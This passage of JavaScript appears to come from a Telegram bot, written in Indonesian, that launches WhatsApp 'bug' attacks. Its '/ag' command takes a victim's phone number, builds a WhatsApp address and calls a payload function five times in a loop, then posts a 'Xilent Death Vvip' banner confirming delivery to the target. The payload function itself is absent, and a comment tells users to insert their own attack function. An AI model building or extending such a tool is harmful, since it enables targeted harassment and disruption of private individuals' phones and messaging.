      .table(
        [
          ["Status", "❌ Error"],
          ["Action", "Cancelled"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("Sinkronisasi script gagal dilakukan.")
      )
      .pre(String(e.message || e), 'text')
      .build();

    await ctx.sendRichMessage(errorMsg);
  }
});
// CASE BUG RICH BY GAPON AJG
bot.command("ag", checkOwner, checkAdmin, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /ag 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const DRAFT_ID = 99;

  await ctx.sendRichMessageDraft(
    DRAFT_ID,
    new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
  );

  const richContent = new HTML()
  .slideshow(
  `<img src="https://l.top4top.io/p_3830yulcb1.jpg"/>`,
  `<img src="https://e.top4top.io/p_3830mmbtm1.jpg"/>`
)

    .heading(2, HTML.customEmoji("6129608584176076842", "🕷") + " Xilent Death Vvip")
    .divider()
    .table(
      [
        ["Detail", "Informasi"],
        ["📱 Target", `+${q.replace(/[^0-9]/g, "")}`],
        ["🕷 Status", "🟢 Terkirim Ke Target"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(HTML.url(`https://wa.me/${q}`, "🔗 Cek Target Via WhatsApp"))
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
        ]
      ]
    }
  });

    try {
    for (let r = 0; r < 5; r++) {
      await xzxzx(sock, target);
      await sleep(1000);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Gagal Mengirim")
        .paragraph(`Terjadi kesalahan saat mengirim ke target ${q}.`)
        .build()
    );
  }
  
});

// TAROK FUNCTION AMPOS LU BY @gaponback


(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();
